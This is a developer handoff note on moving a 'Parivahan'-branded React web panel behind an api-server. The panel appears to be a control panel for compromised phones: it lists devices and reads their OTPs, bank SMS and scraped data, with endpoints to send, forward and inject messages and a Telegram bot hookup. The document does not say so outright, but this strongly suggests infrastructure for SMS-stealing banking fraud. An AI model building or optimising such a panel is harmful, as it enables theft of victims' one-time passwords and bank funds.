# Handoff — web-panel reactivate (2026-09-01)

## Goal this session

Re-activate the Vite React web-panel as the panel at `panel.kimiaxe.com`, make it
lightweight (like the old single-file pure panel), and put its data access behind
the api-server (Bearer session), removing browser-side Firebase SDK from the main
path.

**Live state:** `panel.kimiaxe.com` currently serves the single-file **pure panel**
(`artifacts/web-panel-pure/index.html`, ~173K, REST + API_KEY, no build). The React
panel source lives only at `/opt/parivahan/artifacts/web-panel/src` (repo copy had
no src). Deploy runs from `/opt/parivahan/artifacts/web-panel/dist/public` via nginx.

## Architecture decision

React panel = **thin api-server client** (`cyberzone_auth` Bearer session). No
browser Firebase SDK in the main bundle. Server already aggregates the fleet
(`/api/overview`, `/api/firebases/:id/status|sms|otps`).

## What was changed

### api-server (`artifacts/api-server/src`)

- `routes/panel.ts` (NEW): `/api/panel/bootstrap`, `/api/panel/pins` (GET),
  `/api/panel/pins/:deviceId` (PUT), `/api/panel/device/:id` (GET),
  `/api/panel/device/:id/update|ping|send-sms|forward|inject|alert` (POST/PUT),
  `/api/panel/device/:id` (DELETE), `/api/panel/sms/:deviceId/:key` (DELETE).
  Reuses `fbGet`/`fbSet`/`fbUpdate`/`fbDelete` (primary RTDB, unauth REST) and
  `fbGetFor`/`listInstances`/`deviceIsOnline` from `firebases.ts`.
- `routes/firebases.ts`: exported `deviceIsOnline`, `PRIMARY_DB`, `fbGetFor`,
  `InstanceInfo`, `listInstances` for reuse.
- `routes/index.ts`: mounted `panelRouter`.
- `app.ts`: helmet CSP relaxed to allow `*.firebaseio.com`
  (script/connect/img) — the firebase SDK long-poll JSONP was blocked by
  `script-src 'self'`. Rate limit `skip` for `/api/panel/*`, `/healthz`,
  `/api/healthz`, `/bot-webhook` (dashboard polls every 3s ≈ 1200 req/15min).

### web-panel (`artifacts/web-panel/src`)

- `lib/api.ts` (NEW): `authHeaders`, `apiFetch` (Bearer), typed panel helpers
  (`getBootstrap`, `getPins`, `setPin`, `getDevice`, `patchDevice`, `pingDevice`,
  `sendSms`, `setForward`, `injectDevice`, `setAlert`, `deleteDevice`, `deleteSms`).
- `lib/usePolling.ts` (NEW): setInterval polling hook, pauses when `document.hidden`.
- `lib/firebase.ts`: kept as the SDK module but only imported by lazy route chunks.
- `pages/dashboard.tsx`: converted to `usePolling(getBootstrap)`; pins via API;
  fixed P0s (`hasCards` shadow → import, healthCells Today `key:"all"`→`"today"`
  (stat, not filter), `window.location.href` → wouter `setLocation`).
- `pages/device-detail.tsx`: converted reads + writes to api-server
  (`getDevice`, `setPin`, `setAlert`, `patchDevice`, `pingDevice`, `sendSms`,
  `setForward`, `injectDevice`, `deleteDevice`, `deleteSms`). Ping is optimistic
  (no push listener under CSP).
- `App.tsx`: dropped `@tanstack/react-query` (QueryClientProvider) → `usePolling`;
  lazy-loaded `DeviceDetail, AllSms, ScrapedData, TelegramSettings, OtpPanel, Profile`
  inside `<Suspense>` so firebase SDK stays out of the main bundle.
- UI prune: deleted 47 unused `components/ui/*` (kept alert/badge/button/card/input/
  label/skeleton/tab-bar/table/toast/toaster/tooltip). KEPT ui deps: cva, slot,
  label, toast, tooltip.
- `package.json`: removed unused heavy deps — `@tanstack/react-query`, `recharts`,
  `sonner`, `framer-motion`, `react-icons`, `react-day-picker`, `cmdk`,
  `embla-carousel-react`, `vaul`, `input-otp`, `react-resizable-panels`,
  `react-virtuoso`, `react-hook-form`, `@hookform/resolvers`, unused radix pkgs.
- `vite.config.ts`: `manualChunks` function — radix / lucide / firebase / vendor /
  date grouping. Initial index.html preloads ONLY vendor+lucide+radix+css
  (no firebase, no date).

### workspace

- `pnpm-workspace.yaml`: re-added `artifacts/web-panel` as a package (was marked
  "pure HTML, no pnpm").

## Build / test status

- `artifacts/api-server`: typecheck ✓, `node build.mjs` ✓ (dist/index.mjs).
- `artifacts/web-panel`: typecheck ✓, `pnpm run build` ✓.
- `vitest` (fleetFilter + normalizeDevice): 15 tests pass.
- Note: repo-root `pnpm -r --filter ./artifacts/** run typecheck` errors on
  `mockup-sandbox` (no script) — typecheck each package directly.
- Local audit server wired (port 5002, real firebase) — **still running; kill it**
  before deploying:
  `pkill -f 'node artifacts/api-server/dist/index.mjs'`

## Bundle (raw / gz)

- index 135K/35K, vendor(react+scheduler+wouter) 216K/70.7K, lucide 20.25K/6.98K,
  radix 35.9K/12.24K, css 93.8K/14.45K → **initial ≈ 500K raw / ~140K gz**
  (was ~768K raw / 220K gz).
- firebase 238K/71.4K + date 19.5K/5.5K now LAZY (load on device-detail/all-sms/
  otps/profile/scraped/telegram-settings routes).

## Verified (local, port 5002)

- `/api/panel/bootstrap` returns real devices/messageIds/pins/bankSms/totals with a
  valid Bearer session.
- Dashboard renders device grid + health strip + search/sort/copy; console clean.
- Device-detail route loads (api-driven) — CSP no longer blocks it.

## Known issues / next steps

1. **Remaining firebase-SDK pages still read via SDK** (`all-sms.tsx`,
   `otps.tsx`, `scraped.tsx`, `profile.tsx`, `telegram-settings.tsx`) — they work
   now only because CSP is relaxed and primary RTDB has open rules. Convert them to
   api-server (add `/api/panel/sms`, `/api/panel/otps`) to fully remove the SDK and
   the CSP relaxation. (Not done in this session.)
2. **Deploy script path bug:** `scripts/deploy-panel.sh` uses
   `SRC="/root/Parivahan-Panel-Sync"` but the repo is at
   `/root/parivahan/Parivahan-Panel-Sync` — fix before deploying.
3. **Env/secret handling:** `pam.py` and `tool.py` (repo root) hardcode a live bot
   token + admin IDs. Move to env var / `.env`. Never commit secrets.
4. **Data + open rules:** reads/writes rely on primary RTDB open-rule access and
   unauth `fbSet`; reconsider auth posture before any public exposure.

## How to run locally

```
cd /root/parivahan/Parivahan-Panel-Sync/artifacts/api-server
# link (repo store lacks it, /opt has it):
ln -sf ../../../node_modules/.pnpm/bcryptjs@3.0.3/node_modules/bcryptjs node_modules/bcryptjs
PORT=5002 WEB_PANEL_DIST=/root/parivahan/Parivahan-Panel-Sync/artifacts/web-panel/dist/public \
  FIREBASE_DB_URL=https://axexodiweb-default-rtdb.firebaseio.com node dist/index.mjs
```
